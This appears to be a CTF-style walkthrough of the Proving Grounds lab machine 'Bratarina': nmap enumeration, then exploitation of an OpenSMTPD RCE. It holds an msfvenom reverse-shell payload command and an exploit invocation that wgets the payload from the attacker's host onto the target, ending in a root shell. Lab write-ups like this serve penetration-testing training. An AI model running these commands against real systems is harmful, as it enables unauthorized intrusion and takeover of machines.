---
title: Proving Grounds - Bratarina
date: 2022-09-17 12:00:00 -500 
categories: [Proving Grounds]
tags: [oscp,linux]
---

# Bratarina Overview

Machine Details:

|IP|Hostname|Operating System|
|---|---|---|
|192.168.109.71|Bratarina|Linux|

## Path to Exploitation
Bratarina is a really straightforward machine that requires some basic enumeration of the identified services. In this case we exploit a vulnerable SMTP service that gain root access to the machine. 

# Bratarina Enumeration

## Full Port Scan

```bash
nmap 192.168.109.71 -p- -oA Bratarina/nmap/full-port --open -Pn -vv
```

Which Resulted In:

|PORT|SERVICE|
|----|-------|
|22|ssh|
|25|smtp|
|80|http|
|445|microsoft-ds|

## Service Scan

```bash
nmap 192.168.109.71 -p 22,25,80,445 -sC -sV -oA Bratarina/nmap/service-scan -Pn
```

Which Resulted In:

|PORT|SERVICE|VERSION|
|----|-------|-------|
|22|ssh|7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)|
|25|smtp||
|80|http|1.14.0 (Ubuntu)|
|445|netbios-ssn|smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)|

# SMTP

We see the server version is OpenSMTPD 2.0

We can search for vulnerabilities that affect this version and come across the following [RCE Exploit](https://www.exploit-db.com/exploits/47984)

We try launching reverse shell one-liners with no luck and decide to upload a reverse shell file to the host. We need to generate our reverse shell payload

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.109 LPORT=445 -f elf > evil.elf
```

We'll start an HTTP server and upload our file to the /tmp directory on the host 


```bash
python3 exploit.py 192.168.109.71 25 "wget 192.168.49.109/evil.elf -O /tmp/evil.elf"
```

![Payload](/assets/ProvingGrounds/Bratarina/payload.png)

We get a hit on our HTTP server

![HTTP Callback](/assets/ProvingGrounds/Bratarina/http-hit.png)

We then change our payload to an executable, setup our listener, and launch the payload

![Privilege Escalation](/assets/ProvingGrounds/Bratarina/priv-esc.png)

And we see we get a shell running as root
